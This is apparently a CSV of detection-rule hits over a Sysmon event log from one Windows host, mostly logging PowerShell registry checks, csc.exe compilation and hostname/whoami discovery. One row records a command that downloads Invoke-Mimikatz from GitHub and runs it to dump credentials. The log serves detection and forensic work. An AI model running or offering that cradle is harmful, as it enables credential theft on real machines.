timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data
2026-08-15T12:54:45.852338+00:00,Non Interactive PowerShell Process Spawned,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,1853,DESKTOP-JC89B03,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: '-'
Description: Windows PowerShell
OriginalFileName: PowerShell.EXE
TerminalSessionId: 0
ParentCommandLine: '-'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6464
ParentUser: '-'
LogonGuid: 50A489D6-8269-6A4A-E703-000000000000
Hashes: MD5=6726185B70B5ADF05E8A1A1DF82EBF30,SHA256=64DD55E1C2373DEED25C2776F553C632E58C45E56A0E4639DFD54EE97EAB9C19,IMPHASH=E3007C8E0098D06ABF617EEE6F0C5ABD
ParentProcessGuid: 00000000-0000-0000-0000-000000000000
ProcessId: 10700
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-6195-6A80-6609-000000000200
CommandLine: ""powershell.exe -ExecutionPolicy Restricted -Command \n                        $Res = 0\n                        $InboxIMEs = (@(\n                          '{0000897b-83df-4b96-be07-0fb58b01c4a4}','{03b5835f-f03c-411b-9ce2-aa23e1171e36}',\n                          '{531fdebf-9b4c-4a43-a2aa-960e8fcdc732}','{6a498709-e00b-4c45-a018-8f9e4081ae40}',\n                          '{7c472071-36a7-4709-88cc-859513e583a9}','{81d4e9c9-1d3b-41bc-9e6c-4b40bf79e35e}',\n                          '{81ea0a17-aa39-455b-ba20-ea79a8f98966}','{8613e14c-d0c0-4161-ac0f-1dd2563286bc}',\n                          '{a028ae76-01b1-46c2-99c4-acd9858ae02f}','{a1e2b86b-924a-4d43-80f6-8a820df7190f}',\n                          '{b115690a-ea02-48d5-a231-e3578d2fdf80}','{c2cb2cf0-af47-413e-9780-8bc3a3c16068}',\n                          '{dcbd6fa8-032f-11d3-b5b1-00c04fc324a1}','{e429b25a-e5d3-4d1f-9be3-0c608477e3a1}',\n                          '{f25e9f57-2fc8-4eb3-a41a-cce5f08541e6}','{fa445657-9379-11d6-b41a-00065b83ee53}'\n                        ) | ForEach-Object { [regex]::Escape($_) }) -join '|'\n                        $InboxPattern = 'TIP\\\\(?:' + $InboxIMEs + ')'\n                        $LanguageProfiles = Get-Item 'HKLM:\\SOFTWARE\\Microsoft\\CTF\\TIP\\{????????-????-????-????-????????????}\\LanguageProfile\\0x*\\{????????-????-????-????-????????????}' -EA SilentlyContinue\n                        foreach ($prof in @($LanguageProfiles)) {\n                          if ($prof.PSPath -match $InboxPattern) { continue }\n                          $pp = Get-ItemProperty $prof.PSPath -EA SilentlyContinue\n                          $hasEnable = ($pp.PSObject.Properties.Name -contains 'Enable')\n                          if ((-not $hasEnable) -or ($pp.Enable -eq 1)) {\n                            $Res = 1\n                            break\n                          }\n                        }\n                        Write-Host 'Final result:',$Res\n                    ""
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: '-'
UtcTime: 2026-08-15 12:54:45.811
"
2026-08-15T12:54:51.990977+00:00,Non Interactive PowerShell Process Spawned,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,1859,DESKTOP-JC89B03,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: '-'
Description: Windows PowerShell
OriginalFileName: PowerShell.EXE
TerminalSessionId: 0
ParentCommandLine: '-'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6464
ParentUser: '-'
LogonGuid: 50A489D6-8269-6A4A-E703-000000000000
Hashes: MD5=6726185B70B5ADF05E8A1A1DF82EBF30,SHA256=64DD55E1C2373DEED25C2776F553C632E58C45E56A0E4639DFD54EE97EAB9C19,IMPHASH=E3007C8E0098D06ABF617EEE6F0C5ABD
ParentProcessGuid: 00000000-0000-0000-0000-000000000000
ProcessId: 9800
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-619B-6A80-6909-000000000200
CommandLine: 'powershell.exe -ExecutionPolicy Restricted -Command Write-Host ''Final result: 1'';'
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: '-'
UtcTime: 2026-08-15 12:54:51.975
"
2026-08-16T14:09:50.158589+00:00,Dynamic .NET Compilation Via Csc.EXE,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,2983,DESKTOP-JC89B03,"Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
RuleName: '-'
Description: Visual C# Command Line Compiler
OriginalFileName: csc.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 6864
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=F65B029562077B648A6A5F6A1AA76A66,SHA256=4A6D0864E19C0368A47217C129B075DDDF61A6A262388F9D21045D82F3423ED7,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: 50A489D6-6EA0-6A80-F909-000000000200
ProcessId: 2920
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-C4AE-6A81-A70B-000000000200
CommandLine: '""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\soc\AppData\Local\Temp\gbemaxzr\gbemaxzr.cmdline""'
FileVersion: '4.8.4084.0 built by: NET48REL1'
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:09:50.112
"
2026-08-16T14:11:18.390302+00:00,Non Interactive PowerShell Process Spawned,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,3707,DESKTOP-JC89B03,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: '-'
Description: Windows PowerShell
OriginalFileName: PowerShell.EXE
TerminalSessionId: 0
ParentCommandLine: '-'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 8196
ParentUser: '-'
LogonGuid: 50A489D6-8269-6A4A-E703-000000000000
Hashes: MD5=6726185B70B5ADF05E8A1A1DF82EBF30,SHA256=64DD55E1C2373DEED25C2776F553C632E58C45E56A0E4639DFD54EE97EAB9C19,IMPHASH=E3007C8E0098D06ABF617EEE6F0C5ABD
ParentProcessGuid: 00000000-0000-0000-0000-000000000000
ProcessId: 2396
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-C506-6A81-AD0B-000000000200
CommandLine: ""powershell.exe -ExecutionPolicy Restricted -Command \n                        $Res = 0\n                        $InboxIMEs = (@(\n                          '{0000897b-83df-4b96-be07-0fb58b01c4a4}','{03b5835f-f03c-411b-9ce2-aa23e1171e36}',\n                          '{531fdebf-9b4c-4a43-a2aa-960e8fcdc732}','{6a498709-e00b-4c45-a018-8f9e4081ae40}',\n                          '{7c472071-36a7-4709-88cc-859513e583a9}','{81d4e9c9-1d3b-41bc-9e6c-4b40bf79e35e}',\n                          '{81ea0a17-aa39-455b-ba20-ea79a8f98966}','{8613e14c-d0c0-4161-ac0f-1dd2563286bc}',\n                          '{a028ae76-01b1-46c2-99c4-acd9858ae02f}','{a1e2b86b-924a-4d43-80f6-8a820df7190f}',\n                          '{b115690a-ea02-48d5-a231-e3578d2fdf80}','{c2cb2cf0-af47-413e-9780-8bc3a3c16068}',\n                          '{dcbd6fa8-032f-11d3-b5b1-00c04fc324a1}','{e429b25a-e5d3-4d1f-9be3-0c608477e3a1}',\n                          '{f25e9f57-2fc8-4eb3-a41a-cce5f08541e6}','{fa445657-9379-11d6-b41a-00065b83ee53}'\n                        ) | ForEach-Object { [regex]::Escape($_) }) -join '|'\n                        $InboxPattern = 'TIP\\\\(?:' + $InboxIMEs + ')'\n                        $LanguageProfiles = Get-Item 'HKLM:\\SOFTWARE\\Microsoft\\CTF\\TIP\\{????????-????-????-????-????????????}\\LanguageProfile\\0x*\\{????????-????-????-????-????????????}' -EA SilentlyContinue\n                        foreach ($prof in @($LanguageProfiles)) {\n                          if ($prof.PSPath -match $InboxPattern) { continue }\n                          $pp = Get-ItemProperty $prof.PSPath -EA SilentlyContinue\n                          $hasEnable = ($pp.PSObject.Properties.Name -contains 'Enable')\n                          if ((-not $hasEnable) -or ($pp.Enable -eq 1)) {\n                            $Res = 1\n                            break\n                          }\n                        }\n                        Write-Host 'Final result:',$Res\n                    ""
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: '-'
UtcTime: 2026-08-16 14:11:18.297
"
2026-08-16T14:11:24.552108+00:00,Non Interactive PowerShell Process Spawned,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,3709,DESKTOP-JC89B03,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: '-'
Description: Windows PowerShell
OriginalFileName: PowerShell.EXE
TerminalSessionId: 0
ParentCommandLine: '-'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 8196
ParentUser: '-'
LogonGuid: 50A489D6-8269-6A4A-E703-000000000000
Hashes: MD5=6726185B70B5ADF05E8A1A1DF82EBF30,SHA256=64DD55E1C2373DEED25C2776F553C632E58C45E56A0E4639DFD54EE97EAB9C19,IMPHASH=E3007C8E0098D06ABF617EEE6F0C5ABD
ParentProcessGuid: 00000000-0000-0000-0000-000000000000
ProcessId: 7172
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-C50C-6A81-AF0B-000000000200
CommandLine: 'powershell.exe -ExecutionPolicy Restricted -Command Write-Host ''Final result: 1'';'
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: '-'
UtcTime: 2026-08-16 14:11:24.508
"
2026-08-16T14:35:52.344534+00:00,Dynamic .NET Compilation Via Csc.EXE,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,3962,DESKTOP-JC89B03,"Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
RuleName: '-'
Description: Visual C# Command Line Compiler
OriginalFileName: csc.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=F65B029562077B648A6A5F6A1AA76A66,SHA256=4A6D0864E19C0368A47217C129B075DDDF61A6A262388F9D21045D82F3423ED7,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6384
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CAC8-6A81-EE0B-000000000200
CommandLine: '""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\soc\AppData\Local\Temp\anwazcrt\anwazcrt.cmdline""'
FileVersion: '4.8.4084.0 built by: NET48REL1'
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:35:52.318
"
2026-08-16T14:35:55.144252+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,3966,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6120
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CACB-6A81-F00B-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:35:55.137
"
2026-08-16T14:35:55.411768+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,3967,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8340
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CACB-6A81-F10B-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:35:55.408
"
2026-08-16T14:39:26.563545+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,4205,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9924
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CB9E-6A81-080C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:39:26.559
"
2026-08-16T14:39:26.743956+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,4206,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 32
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CB9E-6A81-090C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:39:26.741
"
2026-08-16T14:44:15.748969+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,4211,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 10476
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CCBF-6A81-0F0C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:44:15.743
"
2026-08-16T14:44:15.808318+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,4212,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 828
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CCBF-6A81-100C-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:44:15.785
"
2026-08-16T15:13:26.729903+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,5675,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 7704
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D396-6A81-9B0C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:13:26.721
"
2026-08-16T15:13:26.807182+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,5676,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8252
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D396-6A81-9C0C-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:13:26.803
"
2026-08-16T15:35:08.700374+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6592,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9624
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D8AC-6A81-F50C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:35:08.696
"
2026-08-16T15:35:08.753767+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6593,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6756
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D8AC-6A81-F60C-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:35:08.746
"
2026-08-16T15:35:14.934715+00:00,HackTool - Mimikatz Execution;Malicious PowerShell Commandlets - ProcessCreation;PowerShell Download and Execution Cradles;Suspicious PowerShell Download and Execute Pattern;Suspicious PowerShell Invocations - Specific - ProcessCreation;Suspicious Program Names,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6594,DESKTOP-JC89B03,"Image: C:\Windows\System32\cmd.exe
RuleName: '-'
Description: Windows Command Processor
OriginalFileName: Cmd.Exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=CB6CD09F6A25744A8FA6E4B3E4D260C5,SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9084
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-D8AD-6A81-F70C-000000000200
CommandLine: '""cmd.exe"" /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1''); Invoke-Mimikatz -DumpCreds""'
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:35:09.929
"
2026-08-16T16:13:38.809847+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6634,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 3944
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1B2-6A81-230D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:13:38.804
"
2026-08-16T16:13:38.842060+00:00,Local Accounts Discovery,C:\logs\sysmon_20260919_043610.evtx,1,Microsoft-Windows-Sysmon,1,6635,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 5172
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1B2-6A81-240D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
